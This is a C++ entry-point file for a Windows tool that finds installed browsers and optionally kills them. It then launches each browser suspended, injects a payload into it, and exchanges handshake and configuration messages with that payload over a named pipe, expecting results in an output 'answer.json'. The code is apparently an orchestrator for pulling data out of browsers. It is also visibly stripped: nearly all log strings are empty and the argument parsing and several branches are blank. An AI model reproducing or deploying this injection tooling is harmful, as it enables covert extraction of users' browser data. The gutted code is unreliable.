#include "../core/common.hpp"
#include "../core/console.hpp"
#include "../sys/internal_api.hpp"
#include "../injector/browser_discovery.hpp"
#include "../injector/browser_terminator.hpp"
#include "../injector/process_manager.hpp"
#include "../injector/pipe_server.hpp"
#include "../injector/injector.hpp"
#include <sstream>

using namespace Injector;

static void ExpectHandshake(PipeServer& pipe, const std::string& expectedMsg, DWORD timeoutMs = 5000) {
    DWORD start = GetTickCount();
    std::string accumulated;
    char buffer[256];
    HANDLE hPipe = pipe.GetHandle();

    while (GetTickCount() - start < timeoutMs) {
        DWORD available = 0;
        if (!PeekNamedPipe(hPipe, nullptr, 0, nullptr, &available, nullptr)) {
            DWORD err = GetLastError();
            if (err == ERROR_BROKEN_PIPE) break;
            Sleep(50);
            continue;
        }
        if (available == 0) {
            Sleep(50);
            continue;
        }
        DWORD read = 0;
        if (!ReadFile(hPipe, buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
            break;
        }
        accumulated.append(buffer, read);
        size_t nullPos;
        while ((nullPos = accumulated.find('\0')) != std::string::npos) {
            std::string msg = accumulated.substr(0, nullPos);
            accumulated.erase(0, nullPos + 1);
            if (msg == expectedMsg) {
                return;
            }
        }
    }
    throw std::runtime_error("");
}

int wmain(int argc, wchar_t* argv[]) {
    std::ostringstream log;

    bool verbose = false;
    bool killBrowsers = false;
    std::wstring targetType;
    std::filesystem::path output = std::filesystem::current_path() / "output";

    for (int i = 1; i < argc; ++i) {
      
    }

    if (targetType.empty()) {
        targetType = L"all";
        log << "" << std::endl;
        log.flush();
    }

    Core::Console console(verbose);
    log << "" << std::endl;
    log.flush();

    if (!Sys::InitApi(verbose)) {
        console.Error("");
        log << "" << std::endl;
        log.flush();
        return 1;
    }
    log << "" << std::endl;
    log.flush();

    try {
        std::filesystem::create_directories(output);
        log << "" << std::endl;
        log.flush();
    }
    catch (const std::exception& e) {
        console.Error("" + std::string(e.what()));
        log << "" << std::endl;
        log.flush();
        return 1;
    }

    std::vector<BrowserInfo> browsers;
    if (targetType == L"all") {
        browsers = BrowserDiscovery::FindAll();
        log << "" << std::endl;
        log.flush();
    }
    else {
        auto single = BrowserDiscovery::FindSpecific(targetType);
        if (single.has_value()) {
            browsers.push_back(single.value());
            log << "" << std::endl;
            log.flush();
        }
        else {
            log << "" << std::endl;
            log.flush();
        }
    }

    if (browsers.empty()) {
        console.Warn("");
        log << "" << std::endl;
        log.flush();
        return 0;
    }

    for (const auto& browser : browsers) {
        log << "" << std::endl;
        log.flush();
        console.BrowserHeader(browser.displayName, browser.version);

        bool fileSaved = false;

        try {
            if (killBrowsers) {
                console.Debug("");
                log << "" << std::endl;
                log.flush();
                BrowserTerminator terminator(console);
                TerminationOptions opts;
                opts.terminateChildren = true;
                opts.waitForExit = true;
                auto termStats = terminator.KillByExeName(browser.exeName, opts);
                log << "" << std::endl;
                log.flush();
                Sleep(500);
            }

            console.Debug("" + Core::ToUtf8(browser.fullPath));
            ProcessManager procMgr(browser);
            procMgr.CreateSuspended();
            log << "" << std::endl;
            log.flush();
            

            PipeServer pipe(browser.type);
            pipe.Create();
            log << "" << std::endl;
            log.flush();
            

            PayloadInjector injector(procMgr, console);
            injector.Inject(pipe.GetName());
            log << "" << std::endl;
            log.flush();

            
            log << "" << std::endl;
            log.flush();
            injector.ResumeRemoteThread();
            log << "" << std::endl;
            log.flush();

            try {
                pipe.WaitForClient();
                log << "" << std::endl;
                log.flush();
                
                ExpectHandshake(pipe, "READY", 10000);

                log << "" << std::endl;
                log.flush();

                log << "" << std::endl;
                log.flush();
                pipe.SendConfig(verbose, false, output, browser.version);
                log << "" << std::endl;
                log.flush();

                ExpectHandshake(pipe, "CONFIG_RECEIVED", 10000);
                log << "" << std::endl;
                log.flush();

                bool payloadSuccess = false;
                std::string payloadError;
                pipe.ProcessMessagesWithConfirmation(verbose, payloadSuccess, payloadError);
                log << "" << std::endl;
                log.flush();

                Sleep(2500);
                procMgr.Terminate();
                log << "" << std::endl;
                log.flush();

                if (payloadSuccess) {
                    fileSaved = true;
                    
                    log << "" << std::endl;
                }
                else if (!payloadError.empty()) {
                    
                    log << "" << std::endl;
                }
                else {
                    std::filesystem::path jsonPath = output / "answer.json";
                    if (std::filesystem::exists(jsonPath) && std::filesystem::file_size(jsonPath) > 0) {
                        fileSaved = true;
                        
                    }
                    else {
                        log << "" << std::endl;
                    }
                }
            }
            catch (const std::exception&) {
                log << "" << std::endl;
                log.flush();
                procMgr.Terminate();
                throw;
            }
        }
        catch (const std::exception&) {
            log << "" << std::endl;
            log.flush();
        }

        if (!fileSaved) {
           
        }
    }

    log.flush();
    return 0;
}
